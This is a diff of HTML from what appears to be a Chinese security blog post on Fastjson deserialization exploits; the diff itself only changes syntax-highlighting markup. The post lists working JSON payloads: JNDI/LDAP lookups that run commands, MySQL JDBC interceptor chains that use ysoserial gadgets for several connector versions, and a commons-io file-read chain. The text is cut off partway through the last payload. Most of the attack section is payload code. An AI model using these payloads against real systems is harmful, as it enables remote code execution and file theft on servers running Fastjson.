+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;proper</span></span><br><span class="line"><span class="string">ties:</span></span><br><span class="line"><span class="string">&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>java.util.Properties<span class="string">&quot;,&quot;</span>UserTransaction<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Fastjson-x3D-1-2-68-要有依赖"><a href="#Fastjson-x3D-1-2-68-要有依赖" class="headerlink" title="Fastjson &#x3D; 1.2.68(要有依赖)"></a><strong>Fastjson &#x3D; 1.2.68</strong>(要有依赖)</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影 响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验:</p>
 <p>expectClass为空:</p>
@@ -493,7 +771,7 @@
 <li>typeName是expectClass的子类</li>
 </ol>
 <h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x.xx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x.xx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>ServerStatusDiffInterceptor链</p>
 <ul>
@@ -509,7 +787,7 @@
 <li>5.1.41 以上 不可用</li>
 </ul>
 <p>利用链分析</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">**queryInterceptors:**一个逗号分割的Class列表(实现了 com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.interceptors</span>.QueryInterceptor接口的Class)，在Query<span class="hljs-string">&quot;之间&quot;</span>进行执行来影响结 果。(效果上来看是在Query执行前后各插入一次操作) **autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**queryInterceptors:**一个逗号分割的Class列表(实现了 com.mysql.cj.interceptors.QueryInterceptor接口的Class)，在Query&quot;之间&quot;进行执行来影响结 果。(效果上来看是在Query执行前后各插入一次操作) **autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。</span><br></pre></td></tr></table></figure></div>
 
 <p>detectCustomCollations链:</p>
 <ul>
@@ -525,37 +803,37 @@
 </ul>
 <p>ServerStatusDiffInterceptor链:</p>
 <p>payload 5.1.11-5.1.48</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>			<span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CommonsCollections5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 利用链 </span><br>      <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span> <br>      <span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections5&quot;</span><span class="punctuation">,</span> <span class="comment">// 利用链 </span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span> </span><br><span class="line">      <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>payload 6.0.2&#x2F;6.0.3</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;connectionString&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span><br>		<span class="hljs-punctuation">&#125;</span> <br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span> </span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>6.0.4中构造方法改变，此利用链无法使用</p>
 </blockquote>
 <p>payload 8.0.19</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><br>     							<span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span> <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"><span class="string">&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span></span><br><span class="line">     							<span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <h4 id="文件写入读取"><a href="#文件写入读取" class="headerlink" title="文件写入读取"></a>文件写入读取</h4><p>依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>payload</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;abc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>					        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span><span class="hljs-comment">//此处传入URL,则此处可使用file jar http 等协议</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                  <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">66</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">					        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///D:/1.txt&quot;</span><span class="comment">//此处传入URL,则此处可使用file jar http 等协议</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">66</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span 